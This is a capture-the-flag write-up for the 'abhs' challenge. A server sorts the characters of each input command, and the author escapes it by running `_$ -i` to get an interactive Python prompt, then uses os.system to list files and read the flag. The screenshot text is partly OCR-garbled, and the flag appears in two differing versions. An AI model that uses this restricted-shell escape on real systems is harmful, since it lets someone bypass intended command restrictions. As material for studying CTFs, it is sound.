# abhs
> Just a warmup.

> nc abhs.bctf23-codelab.kctf.cloud 1337

## About the Challenge
We were given a server. But if we input a command, the server will sort the characters. For example the command `bash`, then the server will execute it as `absh`

## How to Solve?
First, we try to execute `env` command and the result is


[Image extracted text: env
SHLVL-1
LC_CTYPE-C.UTF-8
Flusr/bin/python}
PWD-/home_
user]


As you can see there is an interesting environment variable called `_` and the value is `/usr/bin/python3`

If we input `_$` on the server. The server will be executing a `/usr/bin/python3`


[Image extracted text: $ _ $
test
test
test]


But we still can't do anything, we will force the python to open a prompt using `-i` switches


[Image extracted text: inspect interactively
after
running script;
forces
prompt
even
if stdin does not
appear
to be
terminal;
also PYTHONINSPECT=X]


Now we input `_$ -i` into the server and the result is


[Image extracted text: $ _$ -i
Python
3.8.10 (default,
Nov 14 2022, 12:59.47)
[GCC 9.4.0]
on
linux
Type
"help"
'copyright"
credits"
or
"license
for
more
information_
>>>]


You can import `os` package to run OS command without any restriction


[Image extracted text: 7> >
import
("os
) .system("ls
chal.py
txt
wrapper
sh
7> >
import
"os")  system("cat
txt"
#bctf{gr3at
gu3ss_you_gOt_that_Sorted_out:P}
#comments
so that
you cannot just
exec this
flag
flag]


```
bctf{gr34t_I_gu3ss_you_g0t_that_5orted_out:P}
```